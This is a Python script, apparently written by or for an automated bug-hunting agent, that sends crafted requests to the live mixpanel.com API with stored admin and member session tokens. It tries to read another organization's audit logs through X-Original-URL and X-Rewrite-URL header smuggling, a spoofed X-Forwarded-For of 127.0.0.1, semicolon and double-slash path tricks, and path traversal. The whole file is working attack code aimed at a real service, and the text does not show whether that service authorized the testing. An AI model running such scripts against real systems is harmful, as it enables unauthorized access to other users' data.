#!/usr/bin/env python3
"""Phase F: header-context tests on confirmed POST endpoint."""
import sys, json, time
sys.path.insert(0, '/home/hunter/new_agent/.claude/lib')
from safe_http import SafeHttp

sh = SafeHttp(allow_raw_for_waf=True)

tokens = json.load(open('/home/hunter/new_agent/targets/mixpanel/recon/tokens.json'))
ADMIN  = tokens['ADMIN']
MEMBER = tokens['MEMBER']
IDOR   = tokens['IDOR']
ROLE_MAP = {"ADMIN":ADMIN, "MEMBER":MEMBER, "IDOR":IDOR}

LOG_PATH = '/home/hunter/new_agent/targets/mixpanel/notes/session-log.md'
def log(msg):
    with open(LOG_PATH, 'a') as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] AUDIT-LOG: {msg}\n")

def headers_for(rd):
    return {
        "Cookie": rd['full_cookies'], "X-CSRFToken": rd['csrf'], "Authorization":"Session",
        "Referer":"https://mixpanel.com/",
        "Accept":"application/json, text/plain, */*",
        "User-Agent":"Mozilla/5.0", "Content-Type":"application/json",
    }

BASE = "https://mixpanel.com"
results = []

def call(method, path, role, body=None, extra=None, label=""):
    rd = ROLE_MAP[role]
    h = headers_for(rd)
    if extra: h.update(extra)
    url = BASE + path
    try:
        resp = sh.request(method, url, headers=h, json_body=body, timeout=20) if body is not None \
               else sh.request(method, url, headers=h, timeout=20)
        rec = {
            "label": label, "method": method, "path": path, "role": role,
            "extra_headers": extra or {},
            "status": resp.status_code,
            "content_type": resp.headers.get("Content-Type",""),
            "body_first_400": (resp.text or "")[:400],
        }
        results.append(rec)
        log(f"{label} | {method} {path} as {role} extra={list((extra or {}).keys())} -> {resp.status_code} | {(resp.text or '')[:140]}")
    except Exception as e:
        results.append({"label": label, "err": str(e)})

# F1: ADMIN cookie + X-Original-URL pointing at IDOR's org audit-logs
log("=== PHASE F: header smuggling ===")
call("POST", "/api/app/organizations/3100781/audit-logs", "ADMIN", body={},
     extra={"X-Original-URL":"/api/app/organizations/3100795/audit-logs"}, label="F-XOU-ADMIN->IDOR")
call("POST", "/api/app/organizations/3100781/audit-logs", "ADMIN", body={},
     extra={"X-Rewrite-URL":"/api/app/organizations/3100795/audit-logs"}, label="F-XRW-ADMIN->IDOR")
call("POST", "/api/app/organizations/3100781/audit-logs", "ADMIN", body={},
     extra={"X-Forwarded-For":"127.0.0.1","X-Original-URL":"/api/app/organizations/3100795/audit-logs"}, label="F-XFF+XOU")
# F2: MEMBER cookie + path = own org + Host header swap (HTTPS so SNI matters, but capture behavior)
call("POST", "/api/app/organizations/3100810/audit-logs", "MEMBER", body={},
     extra={"Host":"mixpanel.com"}, label="F-MEMBER-own-Host-ok")
# F3: MEMBER cookie + X-Original-URL to ADMIN's org (should be ignored)
call("POST", "/api/app/organizations/3100810/audit-logs", "MEMBER", body={},
     extra={"X-Original-URL":"/api/app/organizations/3100781/audit-logs"}, label="F-MEMBER-XOU->ADMINorg")
# F4: MEMBER POST to project 4025923 with X-Original-URL = own project (if MEMBER has any project)
call("POST", "/api/app/projects/4025923/audit-logs", "MEMBER", body={},
     extra={"X-Original-URL":"/api/app/organizations/3100810/audit-logs"}, label="F-MEMBER-XOU-cross")

# F5: try semicolon path tricks
call("POST", "/api/app/organizations/3100781/audit-logs;a=b", "MEMBER", body={}, label="F-MEMBER-semicolon")
call("POST", "/api/app/organizations/3100781;/audit-logs", "MEMBER", body={}, label="F-MEMBER-semi-org")
call("POST", "/api/app//organizations/3100781/audit-logs", "MEMBER", body={}, label="F-MEMBER-double-slash")
# F6: path traversal style
call("POST", "/api/app/organizations/3100810/../3100781/audit-logs", "MEMBER", body={}, label="F-MEMBER-traversal")

ts = int(time.time())
out = f"/home/hunter/new_agent/results/mixpanel/audit-log-phaseF-{ts}.json"
with open(out,'w') as f:
    json.dump(results, f, indent=2)
print(f"SAVED {out} ({len(results)} records)")
log(f"Phase F saved {out}")
